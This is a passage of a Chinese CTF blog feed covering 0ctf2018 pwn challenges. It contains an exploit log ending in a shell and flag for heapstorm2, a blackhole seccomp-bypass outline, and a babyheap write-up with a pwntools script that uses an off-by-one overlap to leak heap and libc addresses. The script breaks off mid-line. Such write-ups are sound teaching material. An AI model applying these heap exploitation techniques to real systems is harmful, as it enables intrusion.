</span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &apos;flag\n&apos;</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">    &apos;pow.py\n&apos;</span><br><span class="line">flag</span><br><span class="line">heapstorm2</span><br><span class="line">pow.py</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &apos;cat flag\n&apos;</span><br><span class="line">[DEBUG] Received 0x4b bytes:</span><br><span class="line">    &apos;flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;\n&apos;</span><br><span class="line">flag&#123;Seize it, control it, and exploit it. Welcome to the House of Storm.&#125;</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    &apos;whoami\n&apos;</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">heapstorm2</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;ls\n&apos;</span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    &apos;flag\n&apos;</span><br><span class="line">    &apos;heapstorm2\n&apos;</span><br><span class="line">    &apos;pow.py\n&apos;</span><br><span class="line">flag</span><br><span class="line">heapstorm2</span><br><span class="line">pow.py</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-122421.png" alt=""></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3" target="_blank" rel="noopener">https://gist.github.com/Jackyxty/9de01a0bdfe5fb6d0b40fe066f059fa3</a></p><p><a href="https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md" target="_blank" rel="noopener">https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md</a></p><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/heapstorm2/heapstorm2.i64" target="_blank" rel="noopener">我的i64文件</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overlap </tag>
            
            <tag> chunk shrink </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>堆题里用到的一些杂乱的东西</title>
      <link href="/2018/04/03/heap2/"/>
      <url>/2018/04/03/heap2/</url>
      <content type="html"><![CDATA[<h2 id="small-bin大小"><a href="#small-bin大小" class="headerlink" title="small bin大小"></a>small bin大小</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-020851.png" alt=""></p><h2 id="fastbin的索引"><a href="#fastbin的索引" class="headerlink" title="fastbin的索引"></a>fastbin的索引</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-023424.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-023459.png" alt=""></p><h2 id="计算bin的index"><a href="#计算bin的index" class="headerlink" title="计算bin的index"></a>计算bin的index</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-020954.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021011.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021026.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021050.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021106.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021120.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021134.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021157.png" alt=""></p><h2 id="请求的大小转换为实际的大小"><a href="#请求的大小转换为实际的大小" class="headerlink" title="请求的大小转换为实际的大小"></a>请求的大小转换为实际的大小</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021500.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-022736.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-03-021612.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf2018 blackhole writeup</title>
      <link href="/2018/04/03/blackhole/"/>
      <url>/2018/04/03/blackhole/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/blackhole.tar.gz</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这题和babystack是一样的，除了变成了64位，也是完全没有可以用来输出的函数。<br>而且，这题还设置了沙箱，限制了能够执行的系统调用为mprotect/read/write/exit。<br>所以说没办法getshell，只能一点一点的把flag给“注入”出来。</p><p>思路是先弄出一个syscall gadget,调一下mprotect，读进来shellcode就可以随便操作了。<br>sc逻辑的话，就把flag读进来，然后一个bit一个bit去爆破..<br>相当于sql盲注那样..可以构造个if flag[x]==’a’ sleep else exit..这样</p><p>另外，要想要调用系统调用，可以通过在got表地址里面写掉一个低Byte，从而可以可以跳转到附近的函数去，这里就是系统调用，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-205935.jpg" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>TODO<br>TODO<br>TODO<br>应该会写吧……嗯……</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2csu </tag>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf2018 babyheap writeup</title>
      <link href="/2018/04/03/babyheap/"/>
      <url>/2018/04/03/babyheap/</url>
      <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/0ctf2018/babyheap.tar.gz</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>fastbin attack</li><li>off-by-one</li><li>overlap</li><li>熟悉malloc_state即main_arena,即知道main_arena是存储在libc.so的一个数据段。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~$ checksec /Users/sakura/Desktop/0ctf/babyheap-1/babyheap</span><br><span class="line">[*] &apos;/Users/sakura/Desktop/0ctf/babyheap-1/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>典型的菜单程序<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-181101.png" alt=""><br>比较特别的是存放堆指针的全局变量不再放在bss段，而是随机mmap了一段空间出来存放。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-181129.png" alt=""><br>添加<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-181505.png" alt=""><br>修改<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-181851.png" alt=""><br>删除<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-181957.png" alt=""><br>查看<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-182021.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在修改函数里存在一个off-by-one漏洞，可以用来溢出修改相邻chunk的prev_size或者size.<br>测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">a  = alloc(<span class="number">0x28</span>)</span><br><span class="line">b  = alloc(<span class="number">0x20</span>)</span><br><span class="line">update(a,<span class="string">'A'</span>*<span class="number">0x28</span> + chr(<span class="number">0x41</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br></pre></td></tr></table></figure></p><p>如图：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-183058.png" alt=""><br>这里要注意一点就是我把分配的chunk修改一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a  = alloc(0x20)</span><br><span class="line">b  = alloc(0x20)</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-02-183230.png" alt=""><br>可以看出这样就修改到了下一个chunk的prev_size，之所以分配0x28和分配0x20都得到大小为0x30的chunk，是因为chunk的空间复用，如果当前chunk正在使用中，没有被free掉，那么相邻chunk的prev_size域是无效的，可以被前一个chunk使用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>申请多个chunk，通过off-by-one改变其中一个chunk的size，使其包含两个chunk，即overlap。<br>然后在这个大chunk里伪造fastbin chunk B.<br>然后申请一个和其大小一致的fastbin chunk A，依次释放A和B。<br>则fastbin:B-&gt;A, B的fd就存放着A的堆地址，通过打印大chunk的内容，将其中存放着的小chunk打印出来，从而得到堆地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">meh  = alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>) <span class="comment">#1,为了能够溢出修改到相邻chunk的size</span></span><br><span class="line">vic  = alloc(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">fake = alloc(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>)) <span class="comment">#2的size被修改为0x51,从而将3包括在内,overlapping！</span></span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic) <span class="comment">#2被free，且将3包含在内</span></span><br><span class="line">bigass = alloc(<span class="number">0x40</span>) <span class="comment">#将2再申请出来,此时的2为</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2-&gt;0x555555757050:0x61616161616161610x0000000000000051-&gt;size</span></span><br><span class="line"><span class="string">         0x555555757060:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757070:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment"># 在3伪造chunk，size为0x21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete(meh) <span class="comment">#free 0</span></span><br><span class="line">delete(fake) <span class="comment">## free 3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:fake(3)-&gt;meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])<span class="comment"># show 2，此时的chunk2,[0x30:][:8]即meh(0)的堆地址</span></span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap)) <span class="comment">#因为meh是第一个分配的chunk，所以它的地址就是heap基地址。</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">4</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">3</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]heap address:<span class="number">0x5607a100f000</span></span><br></pre></td></tr></table></figure></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>修改3的大小为超出fastbin范围的small bin的大小，将其free，则其fd和bk都指向main_arena，而main_arena在libc上，减去偏移就得到libc基地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">fake = alloc(<span class="number">0x10</span>)<span class="comment">#再将3申请出来，此时它的内容清空。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2:</span></span><br><span class="line"><span class="string">0x555555757050:0x61616161616161610x0000000000000051</span></span><br><span class="line"><span class="string">0x555555757060:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">0x555555757070:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">index 3:</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">------------------------------------------------------------------</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000020f21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /50gx 0x555555757080</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x5555557570f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757100:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757110:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757120:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757130:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757140:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x555555757150:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757160:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757170:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757180:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757190:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557571a0:0x00000000000000000x0000000000020e61</span></span><br><span class="line"><span class="string">0x5555557571b0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span>  </span><br><span class="line">delete(fake) <span class="comment"># 此时fake的大小属于small chunk,free后被添加到unsort bins, fd和bk指针指向libc上unsort bins的地址.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena  header addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span> <span 